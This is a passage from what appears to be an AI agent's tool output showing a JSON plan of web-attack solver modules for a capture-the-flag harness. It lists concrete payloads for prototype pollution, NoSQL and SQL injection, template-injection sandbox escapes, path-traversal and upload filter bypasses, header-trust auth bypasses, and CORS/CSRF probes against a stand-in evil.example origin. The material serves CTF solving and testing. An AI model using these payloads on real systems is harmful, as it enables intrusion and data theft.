flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board) with today's prompt for the wrong one.\"},\n  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},\n  {\"id\": \"fetch-metadata-matrix\", \"concept\": \"server-judged 'browser' checks: Sec-Fetch-* / Referer / Origin matrix (rows 13a, 24a, 15)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D06 (same-origin callback) and D09 (cross-site CSRF) were both judged purely by request headers, no bot. Pure planner: given a route, a base URL and an optional 'from' page URL, emit header sets {Sec-Fetch-Site: same-origin|same-site|cross-site|none} x {Mode: navigate|cors|no-cors} x {Dest: document|empty|iframe} with matching Referer (from-page / foreign https://evil.example/ / none) and Origin (base / foreign / null), ordered by the error/flag the app returned (browser_callback_required -> same-origin cors; changed_across_sites:false -> cross-site navigate). Parser: evidence/proof regex + boolean flags in the JSON. Fixtures: D06 callback and D09 /api/preferences bodies from day21/day22 logs.\"},\n  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},\n  {\"id\": \"stopgate-503-already-solved\", \"concept\": \"harness: a 503 submit that landed leaves the stop gate closed\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D07 Mastery: submit returned HTTP 503 temporarily_unavailable though the GM registered CORRECT; the retry returned already_solved and stop_gate.py (counts only accepted/correct rows) never released. Owner of hctf/: after a 503, check op=status before retrying, and count already_solved for the owed attempt as done. Same for unverified live variants with expected.json {} (D08 Mastery).\"},\n  {\"id\": \"prototype-pollution\", \"concept\": \"server-side prototype pollution (row 25)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Node-flavoured JSON merge/settings routes: {\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"role\\\":\\\"admin\\\"}}, {\\\"constructor\\\":{\\\"prototype\\\":{...}}}, query-string a[__proto__][x]=1; then re-request the clue/status route. Detect via a reflected polluted key (e.g. json spaces / status code gadgets). D13 (NestJS mass assignment) makes the JSON-merge sibling more likely: after the pollution POST, GET secondary_route (administrator_required) and look for evidence.\"},\n  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"JSON bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}; form username[$ne]=x; $where only when Mongo-flavoured. Field names from the form/JS. Parser: proof or an admin page with the returned session.\"},\n  {\"id\": \"deserialization-gadgets\", \"concept\": \"pickle / PHP / node-serialize cookies (row 21)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Recognise base64 cookies gASV/gAN (pickle), Tzo/YTo (PHP), {\\\"rce\\\" / _$$ND_FUNC$$_ (node-serialize), rO0 (Java). Prefer data tampering (isAdmin/role) over code execution; minimal gadget reading the prompt path otherwise.\"},\n  {\"id\": \"ssti-sandbox-escape\", \"concept\": \"SSTI sequels: filtered/sandboxed engine, file read, stored template (row 11b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D11 rendered `{{objective}}` directly (context var) under a Spring Boot costume; `{{T(java.lang.Runtime)}}` printed a class, ${..}/*{..} stayed literal. A sequel may hide `objective` or filter `{{`. Planner: fingerprint by arithmetic family ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {{7*'7'}} -> 7777777 Jinja2 / 49 Twig), then per-engine reads of the prompt path: Jinja2 cycler.__init__.__globals__.os.popen / lipsum / request.application, Twig source() / _self.env, SpEL T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/run/huntress/objective.txt')), Freemarker ?new() / ?api, ERB File.read, EJS/Nunjucks/Handlebars constructor chains, Thymeleaf __${..}__::. Filter bypasses: attr()/|join, hex/unicode, request.args indirection. Also plant in stored fields read later (row 37). Parser: proof regex in rendered body.\"},\n  {\"id\": \"stored-second-order-generic\", \"concept\": \"plant now, read on another route: second-order for any class (row 37)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D12 pattern generalised: feature_route = POST sink (`post_required`, `saved:true`), secondary_route = later reader. Planner takes a per-class payload list (SQLi ladder, SSTI `{{objective}}`/`${..}`, cmd `;cat <prompt path>`, XSS for a bot) and plants each as JSON (then form) in every common field (name,q,query,note,label,title,value,filter,search,term,report,display_name,bio,comment,message) in one body, re-GETs every reader route after EACH plant. Parser: proof regex only (D12 prints `effect` even when rows are empty).\"},\n  {\"id\": \"header-trust-verb-path-bypass\", \"concept\": \"IP/header trust, method override, path normalisation (rows 15-17)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"For a route that 401/403/405s: X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / Forwarded: for=127.0.0.1; X-Original-URL / X-Rewrite-URL; methods HEAD/POST/PUT/PATCH/OPTIONS + X-HTTP-Method-Override / _method; path variants /ADMIN, /admin/, /admin/., //admin, /./admin, /admin;/, /%61dmin, /admin..;/, trailing ?/#. Stop at the first 200 with proof or effect.\"},\n  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D03 tautology and D12 second-order are seen. Remaining: ORDER BY / NULL-count columns, UNION SELECT with table names from errors or sqlite_master / information_schema, marker-based string column, boolean-blind with a length/row-count oracle (bounded alphabet [0-9a-f_proof], 32 chars), time-based (sleep/randomblob) only when nothing differs, login bypass admin'--. Payloads delivered as JSON body AND query/form (D12 bound JSON only). SQLite/MySQL/Postgres dialects. Title puns to expect: \\\"yes or no\\\", \\\"takes its time\\\", \\\"union\\\".\"},\n  {\"id\": \"logic-race-reset\", \"concept\": \"business logic, race, predictable reset tokens (rows 26, 27)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Numeric fields (negative, zero, huge, float), coupon/redeem replay, ~20-request parallel burst for a single-use action, reset tokens the app leaks (timestamp, md5(email), sequential). No credential guessing.\"},\n  {\"id\": \"type-juggling-auth\", \"concept\": \"loose comparison / JSON type confusion in auth or token checks (row 34)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"PHP/Laravel or Node costume with a token/PIN/password compare. JSON bodies with true, 0, \\\"0\\\", [], {}, null, \\\"0e1\\\" magic hashes, arrays where strings are expected (strcmp(array) == 0), numeric strings with whitespace. Field names from the form/clues. Parser: effect+evidence / proof.\"},\n  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},\n  {\"id\": \"session-id-weakness\", \"concept\": \"session hijack: predictable / leaked / non-rotated session ids (row 32)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D08 sequel. Collect every session-like value the app reveals (Set-Cookie, clue hints, URLs, /api/history, logs pages, Referer leaks); detect structure (sequential int, timestamp, md5(user), base64 JSON); plan reuse of a leaked victim id as arena_session/sid cookie and a logout-then-reuse check. Never guess beyond values the app derives from data it shows.\"},\n  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},\n  {\"id\": \"graphql-introspection\", \"concept\": \"GraphQL schema leak / hidden field (row 23)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Introspection query, list fields, query hidden ones (proof, secret, evidence, note) and node(id) lookups (IDOR over GraphQL); field suggestions when introspection is off.\"},\n  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Planner from D04's set: nested strip (....//, ..././), URL / double / overlong encodings, backslash, required prefix (pages/../../..), appended suffix (%00, ?, #, php://filter), absolute, file://, /proc/self/cwd and /proc/self/root. Cheapest first; decode base64 filter output.\"},\n  {\"id\": \"upload-filter-bypass\", \"concept\": \"upload sequels: enforced type filter, served-path traversal, stored SVG/HTML (row 20b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D10's policy (txt, text/plain) was never enforced. Sequel planner over the same upload_shape (JSON filename/content/content_type, or multipart if the form says so): double extension (n.txt.html, n.html.txt), case (N.HTML), trailing dot/space, content_type spoof vs extension, GIF89a/PNG magic prefix, filename traversal (../n.html, ..%2fn.html) to land in a served dir named by the clues, SVG with script or XXE, template syntax in the content per the guide. Parser: read the returned path/url, GET it, proof regex.\"},\n  {\"id\": \"headless-browser\", \"concept\": \"client-side JS execution for DOM XSS / CSRF checks (rows 13c, 24a)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"D06-D07 needed none (server-judged headers; GM-side bot). Install only if a day demands local JS execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or system chromium --headless --dump-dom).\"},\n  {\"id\": \"bopla-field-read\", \"concept\": \"excessive data exposure / hidden-field read on API routes (row 36)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"API-family sibling of D13 (OWASP API3 read side). For each JSON route: query ?fields=*, ?include=all, ?expand=*, ?view=admin|full|debug, ?debug=1, Accept: application/vnd.api+json, and compare the key sets against the page; also scan list endpoints for objects with keys the HTML omits (secret, proof, note, internal). Parser: proof regex after JSON flattening.\"},\n  {\"id\": \"http-param-pollution\", \"concept\": \"duplicate params / keys split between proxy and app (row 35)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"For a route whose check and action read the same param: a=safe&a=evil, a[]=..., JSON duplicate keys (first vs last wins), mixed query + body copies, ; separators. Order the planner by which copy the error names. Parser: proof regex.\"},\n  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"}\n]\n```\n","numLines":182,"startLine":1,"totalLines":182}},"tool_result_meta":[{"id":"toolu_011kHWbQXdcAxDkk3RJP59VU","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
